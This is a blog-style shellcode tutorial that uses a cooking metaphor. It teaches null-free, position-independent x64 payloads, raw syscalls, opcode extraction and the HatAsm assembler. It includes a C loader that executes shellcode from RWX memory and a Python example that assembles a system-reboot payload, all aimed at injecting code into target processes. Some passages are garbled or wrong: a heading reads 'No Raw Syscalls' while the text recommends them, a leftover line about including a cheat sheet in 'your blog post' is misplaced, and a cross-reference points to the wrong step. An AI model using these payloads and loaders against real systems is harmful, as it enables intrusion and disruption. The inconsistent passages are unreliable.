---
title: Backing Perfect Shellcode - Recipe for Real Hackers
categories: [Payloads]
tags: [malware, assembly, shellcodes]
pin: true
author: enty8080
image:
  path: https://raw.githubusercontent.com/enty8080/Shellcode-Kitchen/refs/heads/main/data/logo.png
---

> *"Most developers spend their careers building things up. We’re here to break them down—with style. Writing shellcode is the culinary art of exploitation: it requires precision, the removal of impurities, and the ability to work in a kitchen that wasn't built for you. In this guide, we're ditching the store-bought libraries and baking a raw, null-free payload from scratch. Grab your apron and your assembler; it’s time to cook."*

## Step 1: Discard the "Baking Pans" (Remove Sections)

In a traditional kitchen, you have different bowls for different ingredients: a bowl for dry goods, a bowl for liquids, and a tray for the oven. In programming, these are your **ELF or PE sections**. Your code lives in `.text`, your initialized variables (like strings) live in `.data`, and your uninitialized buffers live in `.bss`.

When you're "baking" shellcode, you don't have the luxury of a structured kitchen. You are injecting your code into a foreign process that hasn't prepared any bowls for you. If your code tries to reach for a string in a `.data` section that wasn't injected, the program will segmentation fault immediately.

* **The Fix:** You must bake a **Position-Independent Blob**. This means treating your assembly like a one-pot meal. All your constants, strings, and variables must be embedded directly within the execution flow.

**Example: The Wrong Way vs. The Hacker Way**

| Kitchen Setup | Assembly Style | Result |
| --- | --- | --- |
| **Traditional (Sectioned)** | Declaring `/bin/sh` in the `.data` section. | **Crash.** The pointer looks for an address that doesn't exist in the target process. |
| **Shellcode (Single-Pot)** | Using a `jmp/call/pop` trick or pushing the string onto the stack. | **Success.** The data travels *with* the code. |

## Step 2: Use "Room Temperature" Addresses (RIP-Relative Addressing)

Imagine a recipe that says, "Walk exactly 400 miles North to find the salt." If you move your kitchen to a different city, that instruction is useless. This is what happens when you use **Absolute Addressing**. Standard compilers hardcode addresses (e.g., `0x401050`), assuming the program always loads at the same base address.

In the world of exploitation, **ASLR (Address Space Layout Randomization)** moves your "kitchen" every time the program runs. If your shellcode looks for a "salt" (a string) at a fixed address, it will "crack" because that memory address might now hold garbage—or nothing at all.

* **The Fix:** Use **RIP-Relative Addressing**. In x64 assembly, the `RIP` (Instruction Pointer) always knows where you are *right now*. Instead of hardcoding a location, you calculate the location of your data relative to the current instruction.

**The "Chef’s Technique" (Example):**
Instead of telling the CPU to go to a fixed coordinate, we tell it to look "30 paces ahead."

```nasm
; --- THE CRACKED WAY (Absolute) ---
mov rdi, 0x401050          ; Hardcoded address - fails if moved!

; --- THE PERFECT BAKE (RIP-Relative) ---
lea rdi, [rel my_string]   ; "Load Effective Address" relative to RIP
; ... execution continues ...
my_string: db "/bin/sh", 0

```

By using `[rel my_string]`, the assembler calculates the **offset** (the distance between the instruction and the string). No matter where in memory your shellcode is injected, the distance between the code and the data remains constant.

### Step 3: Sift Out the "Lumps" (Eliminate Null Bytes)

In C-style string functions (like `strcpy` or `gets`), the null byte (`0x00`) is the universal "stop" sign. If your shellcode is being injected via a string vulnerability, the moment the target application hits a `0x00` in your code, it thinks the party is over. It stops copying, leaving your shellcode half-baked and non-functional inside the buffer.

There are many other bad chars like `0x00` that can be seen in this table:

| Byte   | Name  | Why it breaks     | Common vectors            |
| ------ | ----- | ----------------- | ------------------------- |
| `0x00` | NULL  | String terminator | `strcpy`, `gets`, `scanf` |
| `0x0a` | LF    | Line end          | HTTP, fgets               |
| `0x0d` | CR    | Line end          | FTP, SMTP                 |
| `0x20` | Space | Token split       | CLI parsing               |
| `0x09` | TAB   | Token split       | Shell parsing             |
| `0x2f` | `/`   | Path parsing      | Filters, WAFs             |
| `0x5c` | `\`   | Escape            | Windows exploits          |

> **Chef’s Rule:** Bad characters are not universal. They are dictated by the delivery vector, not the CPU.

* **The Fix:** You must use **Instruction Substitution**. You need to achieve the same result (e.g., putting a zero in a register) without actually using the byte `00` in your machine code. Think of it as finding a lactose-free substitute that tastes exactly like the original.

**The "Chef’s Technique" (Example):**

Let’s look at how to set a register to zero or a small value without hitting those "lumps."

| The "Lumpy" Way (Contains Nulls) | The "Sifted" Way (Null-Free) | Why it works |
| --- | --- | --- |
| `mov rax, 0` | `xor rax, rax` | XORing a register against itself always results in zero and generates the clean opcode `48 31 c0`. |
| `mov al, 2` | `push 2` <br>

<br> `pop rax` | `mov rax, 2` would be padded with nulls (e.g., `b8 02 00 00 00`). Pushing/Popping uses single-byte opcodes. |
| `mov rbx, 0xFF` | `xor rbx, rbx` <br>

<br> `mov bl, 0xFF` | We clear the whole register first, then only move data into the "low" 8-bit part (`bl`), avoiding the zero-padding. |

### The "Shrink-Wrap" Trick

When you need a small number, don't use the 64-bit or 32-bit registers directly if you can avoid it. Using `mov eax, 5` still results in `b8 05 00 00 00`. Instead, use the 8-bit sub-registers (like `al`, `bl`, `cl`) after zeroing the register out. This ensures your final binary string is dense, flavorful, and entirely "clean."

## Step 4: Fold in the "Air" (Dynamic Stack Allocation)

When you're baking at home, you have a counter full of mixing bowls (the `.bss` and `.data` sections). But as a hacker-chef, you're working in a "pop-up kitchen." You don't have pre-allocated space to store your whisked eggs or your 8KB data buffer. If you try to write data to a random spot in memory, you’ll likely overwrite your own code or trigger a "kitchen fire" (Access Violation).

* **The Fix:** You must manipulate the **Stack Pointer (`RSP`)**. The stack is your most reliable workspace. By "folding in" space, you are manually carving out a private area in the existing stack where you can store variables, buffers, and intermediate results.

**The "Chef’s Technique" (Example):**

Think of the stack as a vertical rack of trays. Usually, the stack grows downward. By subtracting from `RSP`, you move the "bottom" of the stack even further down, leaving a massive empty gap above it for your personal use.

| The Amateur Mistake | The Master Chef Move | Why it works |
| --- | --- | --- |
| Writing data to a hardcoded address like `0x5000`. | `sub rsp, 0x1000` | This creates a 4KB "clean zone" on the stack. |
| Using `push` for every single byte of a large buffer. | `lea rdi, [rsp]` | After creating the space, you can use `rdi` as a pointer to your new "mixing bowl." |
| Forgetting to clean up (Stack Corruption). | `add rsp, 0x1000` | At the end of the recipe, you must "clean your station" by moving the pointer back. |

**Important Note on "Lumps":**
Be careful! `sub rsp, 0x100` might look fine, but if you need to subtract a small amount, `sub rsp, 0x10` contains null bytes (`83 ec 10` is fine, but `48 81 ec ...` might not be). Master chefs often use a series of smaller subtractions or `xor`/`sub` combinations to keep the shellcode "sifted" and null-free.

> **Chef’s Pro-Tip:** Always ensure your stack is **16-byte aligned** before calling any external "spices" (library functions like `libc`). Some functions are very picky and will crash if the stack isn't perfectly aligned.

## Step 5: Avoid the "Store-Bought" Stuff (No Raw Syscalls)

In a normal environment, you’d just call `printf("Hello")`. Behind the scenes, the OS looks up the address of `printf` in the `libc.so` library. But in shellcode, you are a ghost in the machine. You don't know where `libc` is, and you can't trust the "pantry" to be stocked. If you try to jump to a library function that isn't there, your shellcode will spoil instantly.

* **The Fix:** Use **Raw Syscalls**. You must bypass the "grocery store" (libraries) and go straight to the "farm" (the Kernel). By using the `syscall` instruction, you talk directly to the heart of the Operating System.

**The "Chef's Technique" (The Syscall Table):**
To make a syscall, you must hand-deliver your arguments to specific registers. Think of `RAX` as the **Recipe Number** and the other registers as your **Measured Ingredients**.

**Example: Serving the "Hello World" Appetizer**

| Register | Ingredient | Purpose |
| --- | --- | --- |
| **RAX** | `1` | The Syscall Number for `sys_write`. |
| **RDI** | `1` | File Descriptor (1 = `stdout`). |
| **RSI** | `[rel msg]` | The pointer to your string (baked in from Step 2!). |
| **RDX** | `13` | The length of the string. |

**The Assembly Execution:**

```nasm
; --- THE RAW SYSCALL ---
xor rax, rax
add al, 1          ; RAX = 1 (sys_write), no null bytes!
xor rdi, rdi
add dil, 1         ; RDI = 1 (stdout)
lea rsi, [rel msg] ; RSI = pointer to string
xor rdx, rdx
add dl, 13         ; RDX = length
syscall            ; Signal the Kernel to serve the dish

```

### The Chef's Secret: The "Ghost" Return

When your shellcode finishes, you can't just let the CPU fall off a cliff. You need to exit gracefully or pass control back. Always end your recipe with a `sys_exit` (RAX = 60) syscall, or your "kitchen" will crash as soon as the meal is served.

## Step 6: The Cooling Phase (Extracting the Opcodes)

When you compile assembly with `nasm` or `gcc`, the result is usually an **ELF (Executable and Linkable Format)** file. This file is bloated with "packaging"—metadata that tells the OS how to load it. Your injection vector (like a buffer overflow) won't understand an ELF file; it only understands raw **Opcodes** (Operation Codes).

* **The Fix:** You must perform a **Hex Extraction**. This is the process of scraping the "burnt edges" (headers) off your file to leave behind the pure, concentrated machine instructions. This hex string is your actual payload.

**The "Chef’s Technique" (Tools of the Trade):**

To get your shellcode out of the binary and into your exploit script, you use a "zester" like `objcopy` or a simple `bash` one-liner.

**1. The "Zester" Method (objcopy):**
This command rips the `.text` section out and saves it as a flat binary file.

```bash
objcopy -O binary --only-section=.text recipe.elf recipe.bin

```

**2. The "Plating" Method (hexdump):**
To get a string you can paste into a Python exploit script, use this command to format the output into a "C-style" string:

```bash
hexdump -v -e '"\\""x" 1/1 "%02x" ""' recipe.bin
# Output: \x48\x31\xc0\x48\xff\xc0...

```

| The Ingredient | The Form | The Purpose |
| --- | --- | --- |
| **Source** | `recipe.asm` | The readable recipe you wrote. |
| **Object** | `recipe.o` | The pre-cooked ingredients. |
| **Binary** | `recipe.bin` | The pure, raw "cake." |
| **Hex String** | `"\x48\x31..."` | The final "plated" dish ready to be injected. |

**The "Taste Test":**
Before serving this to a target, a master chef always tests it in a controlled environment. We use a **Shellcode Loader**—a tiny C program that allocates executable memory, copies the hex string into it, and jumps to it.

```c
// A simple "Tasting Plate"
char shellcode[] = "\x48\x31\xc0..."; 
int main() {
    void *exec = mmap(0, sizeof(shellcode), PROT_READ|PROT_WRITE|PROT_EXEC, MAP_ANONYMOUS|MAP_PRIVATE, -1, 0);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)(); // "Bite" into the shellcode
}

```

## Step 7: The "Deglazing" Phase (Size Optimization)

When "plating" your shellcode, space is your most valuable resource. A massive, clunky payload is easy to spot and hard to inject. "Deglazing" is the process of removing the unnecessary bulk, leaving behind only the most potent, concentrated instructions. If your payload is too large, it might get truncated by the application, leaving you with a "collapsed souffle" that won't execute.

* **The Fix:** Use **Instruction Compaction**. Replace multi-byte instructions with single-byte equivalents. Every byte you save is a byte closer to a successful injection.

**The Master Chef’s Shortcuts:**

* **The "Push-Pop" Swap:** A standard `mov rax, 59` (the `execve` syscall) is a 7-byte behemoth. By using `push 59` followed by `pop rax`, you achieve the same result in just 3 bytes. You’ve just saved 4 bytes with a simple "tuck."
* **The "XOR" Shortcut:** We already used this to avoid nulls, but it's also a weight-saver. `mov rdx, 0` is 7 bytes; `xor rdx, rdx` is 3 bytes. It’s the classic way to keep the "dough" light.
* **The "Exchange" Trick:** If you have a value in `rax` that you need in `rdi` (like a socket file descriptor), don't `mov rdi, rax`. Use `xchg rdi, rax`. This is often a 1 or 2-byte instruction, saving you another precious byte over a `mov`.
* **The "Sign Extension" Hack:** This is the chef's secret weapon. If `rax` is already zero (perhaps after a successful syscall), the instruction `cdq` (Convert Doubleword to Quadword) will effectively zero out `rdx` by extending the sign bit. Total cost? **1 byte.**

Here is your **Official Hacker-Chef Recipe Card**. This is the perfect "cheat sheet" to include at the end of your blog post, giving your readers a quick-reference guide to the techniques they’ve learned.

## Step 8: Use a "Smart Oven" (Fast-Tracking with HatAsm)

In the previous steps, we used a multi-tool approach: `nasm` to assemble, `objcopy` to strip, and `hexdump` to view. While reliable, it’s slow for a chef on the move. Enter **[HatAsm](https://github.com/EntySec/HatAsm)** - a powerful, all-in-one assembler and disassembler that lets you "bake" and "taste" your shellcode in one go.

* **The Fix:** Replace your entire toolchain with HatAsm. It handles multiple architectures (x64, ARM, MIPS) and can even emulate your code to make sure it doesn't "burn" before you serve it.

### The "Chef’s Technique" (Speed Baking):

Instead of switching windows and running three different commands, you can use HatAsm’s interactive shell to see your opcodes appear in real-time as you type.

**1. Instant Feedback (The Interactive Shell):**
Fire up the tool and start typing your assembly. It will give you the hex output immediately, perfect for checking if a specific instruction introduces a null byte.

```bash
# Launch interactive mode for x64
hatasm -a --arch x64

[hatasm]> xor rax, rax
00000000  48 31 c0                                         |H1.             |
[hatasm]> push 0x3b
00000000  6a 3b                                            |j;              |

```

**2. The "Flash Bake" (One-Liner):**
If you have your assembly file ready, you can skip the manual extraction and go straight to a clean hex string:

```bash
# Assemble an input file directly to a hex string
hatasm -a --arch x64 -i recipe.asm

```

**3. The "Taste Test" (Emulation):**
One of the most powerful features of HatAsm is the `-e` flag. It uses an emulation engine to run your code in a sandbox.

```bash
# Assemble and Emulate to see if it crashes
hatasm -a --arch x64 -e

[hatasm]> push 0x3b
------ cpu context ------
rax : 0x0000000000000000 rbx : 0x0000000000000000 rcx : 0x0000000000000000 rdx : 0x0000000000000000
rsi : 0x0000000000000000 rdi : 0x0000000000000000 r8  : 0x0000000000000000 r9  : 0x0000000000000000
r10 : 0x0000000000000000 r11 : 0x0000000000000000 r12 : 0x0000000000000000 r13 : 0x0000000000000000
r14 : 0x0000000000000000 r15 : 0x0000000000000000
rip : 0x0000000000000002 rbp : 0x0000000010000000 rsp : 0x0000000012fffff8
cs  : 0x0000000000000000 ss  : 0x0000000000000000 ds  : 0x0000000000000000 es  : 0x0000000000000000
fs  : 0x0000000000000000 gs  : 0x0000000000000000
flags : 0x0000000000000002 (cf:0 zf:0 of:0 sf:0 pf:0 af:0 df:0)
----------------- stack context -----------------
0x0000000012ffffc0 : 0000000000000000 0000000000000000 0000000000000000 0000000000000000
0x0000000012ffffe0 : 0000000000000000 0000000000000000 0000000000000000 000000000000003b
0x0000000013000000 : 0000000000000000 0000000000000000 0000000000000000 0000000000000000
0x0000000013000020 : 0000000000000000 0000000000000000 0000000000000000 0000000000000000
0x0000000013000040 : 0000000000000000 0000000000000000 0000000000000000 0000000000000000

00000000  6a 3b                                            |j;              |
```

| Traditional Tool | HatAsm Equivalent | Why it's Better |
| --- | --- | --- |
| `nasm -f elf64` | `hatasm -a --arch x64` | No intermediate object files. |
| `objcopy -O binary` | `hatasm -o output.bin` | Direct binary output. |
| `hexdump -C` | Integrated View | Hex and ASCII are displayed as you type. |
| `gdb` (for quick tests) | `-e` (Emulation) | Test logic without leaving the assembler. |

### The Baker’s Pro-Tip:

If your target is a different "kitchen" altogether (like an ARM-based IoT device), you don't need to install a new cross-compiler. Just change the "setting" on your HatAsm oven: `hatasm -a --arch aarch64`. It’s the ultimate multi-tool for the modern hacker-chef.

## Step 9: The "Industrial Mixer" (Python Integration)

For the master chef who needs to produce hundreds of variations of a recipe, manual assembly is too slow. By using **HatAsm’s Python API**, you can write scripts that bake shellcode programmatically. This is incredibly useful for "on-the-fly" payload generation where you might need to inject dynamic values—like an IP address or a port number—directly into the assembly before it's "cooked."

* **The Fix:** Use the `HatAsm()` class to handle assembly and disassembly within your own Python exploits.

### The "Chef's Technique" (Automated Baking):

**1. The Automatic Oven (Assembling):**
You can feed a raw string of assembly instructions into HatAsm and get back a hex-dumped result instantly.

```python
from hatasm import HatAsm

hatasm = HatAsm()
# Our raw assembly recipe
code = """
start:
    mov al, 0xa2      ; sys_sched_setparam
    syscall

    mov al, 0xa9      ; sys_reboot
    mov edx, 0x1234567
    mov esi, 0x28121969
    mov edi, 0xfee1dead
    syscall
"""

# Bake it for x64 architecture
result = hatasm.assemble('x64', code)

# Plate it with a beautiful hexdump
for line in hatasm.hexdump(result):
    print(line)

```

**2. Reverse Engineering the Dish (Disassembling):**
Sometimes you find a "mystery dish" (binary blob) and need to know the ingredients. HatAsm can take raw bytes and turn them back into a readable recipe.

```python
from hatasm import HatAsm

hatasm = HatAsm()
# Raw "mystery" bytes
code = (
    b"\xb0\xa2\x0f\x05\xb0\xa9\xba\x67\x45\x23\x01\xbe"
    b"\x69\x19\x12\x28\xbf\xad\xde\xe1\xfe\x0f\x05"
)

# Break it down into mnemonics (instructions)
for line in hatasm.disassemble('x64', code):
    print(f"{line.mnemonic:10} {line.op_str}")

```

### Why use the Python API?

* **Dynamic Payloads:** Automatically swap out a `connect()` IP address based on your current listener.
* **Obfuscation:** Programmatically insert "junk" instructions (NOPs) to change the shellcode's signature.
* **Rapid Prototyping:** Test how different instructions change the final byte size without leaving your script.

## Recipe Card: The Perfect Shellcode

**Yields:** 1 Functional, Null-Free, Position-Independent Payload

**Difficulty:** Hard (Black Apron Level)

### Essential Ingredients

* **The Base:** x64 Assembly (`nasm`, `hatasm`)
* **The Sifter:** `xor` operations (to remove null bytes)
* **The Bowl:** The Stack (`rsp` manipulation)
* **The Spice:** Raw Syscalls (`rax` mapping)
* **The Plating:** `objcopy` & `hexdump` / `hatasm`

### Preparation Steps

| Phase | Technique | Purpose |
| --- | --- | --- |
| **1. Prep the Surface** | **Single-Section Layout** | Move all data into `.text`. Shellcode has no room for separate `.data` pans. |
| **2. Seasoning** | **RIP-Relative Addressing** | Use `[rel label]` so your code tastes the same no matter where it's served in memory. |
| **3. Sifting** | **Instruction Substitution** | Swap `mov` for `xor`, `push/pop`, and `inc/dec` to remove those bitter `0x00` lumps. |
| **4. Folding** | **Stack Allocation** | `sub rsp, 0x500` to create volume for your buffers without crashing the kitchen. |
| **5. The Sauce** | **Raw Syscalls** | Bypass store-bought libraries. Measure your `rax`, `rdi`, and `rsi` by hand. |
| **6. Cooling** | **Opcode Extraction** | Strip the ELF metadata. You only want the raw, concentrated machine code string. |
| **7. Deglazing** | **Size Optimization** | Use `xchg` and `cdq` to reduce the byte-count for tight "serving sizes." |

### Pro-Tips for the Head Chef

* **Avoid Overcooking:** Don't use `mov rax, [address]`—it’s too heavy and uses absolute paths.
* **Keep it Clean:** Always `xor` your registers before use to ensure no "leftover flavors" from the host process interfere with your logic.
* **The Taste Test:** Always verify your payload in a local "Testing Plate" (C loader) before deploying.

## Troubleshooting: When the Bake Falls Flat

Even the best hacker-chefs face a "kitchen fire" now and then. If your shellcode is crashing the target process instead of spawning a shell, check these common points of failure:

### 1. The "Soggy Bottom" (Stack Alignment)

In x64 Linux, the stack must be **16-byte aligned** before calling any external functions or certain syscalls.

* **The Symptom:** Your code runs fine until a specific instruction, then triggers a `SIGSEGV`.
* **The Fix:** Ensure your `RSP` ends in a `0`. If you’ve pushed an odd number of 8-byte registers, add a "dummy" `push rax` or `sub rsp, 8` to level the floor.

### 2. "Burnt" Opcodes (Bad Characters)

Null bytes aren't the only "lumps" to worry about. Some protocols (like FTP or HTTP) might treat `0x0D` (Carriage Return) or `0x0A` (Line Feed) as the end of your input.

* **The Symptom:** Your shellcode is truncated halfway through, even though there are no null bytes.
* **The Fix:** Use a hex editor to scan for "Bad Chars" specific to your injection vector. Use the same substitution tricks (Step 7) to swap them out.

### 3. "No-Fly Zone" (NX/DEP Protection)

Modern OSs often use **NX (No-Execute)** bits. If you've injected your code into the Stack or Heap, the CPU might refuse to "eat" it.

* **The Symptom:** An immediate crash with an "Access Violation" at the very first instruction.
* **The Fix:** You’ll need a "glaze"—this is where **ROP (Return Oriented Programming)** comes in, allowing you to bypass NX by reusing existing code snippets.

### 4. "The Wrong Oven" (Architecture Mismatch)

Running 32-bit (x86) shellcode on a 64-bit (x64) process—or vice versa—will result in total chaos.

* **The Symptom:** The CPU interprets your opcodes as completely different, nonsensical instructions.
* **The Fix:** Double-check your target. Use `file` on the target binary to ensure you are baking for the right architecture.

**Bon Appétit!** Your shellcode is now perfectly baked, sifted, and plated. It is position-independent, null-free, and optimized for the tightest buffers.

